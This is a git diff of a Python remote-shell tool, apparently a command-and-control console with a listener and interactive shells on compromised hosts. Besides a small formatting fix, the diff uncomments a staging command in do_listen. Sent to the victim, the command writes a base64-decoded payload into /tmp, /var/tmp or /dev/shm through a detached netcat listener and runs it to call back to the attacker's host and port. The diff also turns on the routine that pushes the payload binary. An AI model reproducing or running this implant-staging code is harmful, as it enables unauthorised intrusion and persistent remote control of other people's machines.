@@ -88,7 +88,7 @@ class NetShell(cmd.Cmd):
             else:
                 path = pretty(self.server.send_command(f"realpath {line}"))
 
-        sys.stdout.write(f"{path}{'=' * (len(path))}\n\n{ls}\n")
+        sys.stdout.write(f"{path}\n{'=' * (len(path))}\n\n{ls}\n")
     
     def do_send(self, line):
         check = self.server.send_command(f"sendingfile/{line}")
@@ -108,7 +108,7 @@ class NetShell(cmd.Cmd):
         if self.output:
             sys.stdout.write(f"{self.output}\n")
 
-    def do_cd(self, line):
+    def do_cd(self, line): # BUG: Causes cryptography.exceptions.InvalidTag for some reason
         self.output = pretty(self.server.send_command(f"cd {line}"))
         if self.output:
             sys.stdout.write(f"{self.output}\n")
@@ -154,7 +154,6 @@ class LocalShell(cmd.Cmd):
     """
 
     def do_listen(self, line):
-        paths = ["/tmp", "/var/tmp", "/dev/shm"]
         if not line:
             host, port = ("0.0.0.0", 4242)
         else:
@@ -171,15 +170,15 @@ class LocalShell(cmd.Cmd):
         if sock.sysinfo.is_nc:
             logging.info(f"Sending payload..")
 
-            # sock.client_socket.send(f"cd /tmp || cd /var/tmp || cd /dev/shm ; touch payload ; chmod +x payload ;" \
-            #                                 f"setsid sh -c '{sock.sysinfo.is_nc} -lnp 1234 | base64 -d > payload ;"\
-            #                                 f"sleep 5 ; ./payload {host} {port}'\n"\
-            #                                 .encode())
+            sock.client_socket.send(f"cd /tmp || cd /var/tmp || cd /dev/shm ; touch payload ; chmod +x payload ;" \
+                                            f"setsid sh -c '{sock.sysinfo.is_nc} -lnp 1234 | base64 -d > payload ;"\
+                                            f"./payload {host} {port}'\n"\
+                                            .encode())
 
             # TODO: add a check that confirms that netcat is running if not just skip 
             sock.server_socket.close()
             sock.client_socket.close()
-            # send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
+            send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
             logging.info(f"Payload sent. Starting listener..")
             
             sock = listen(host, port, 1)
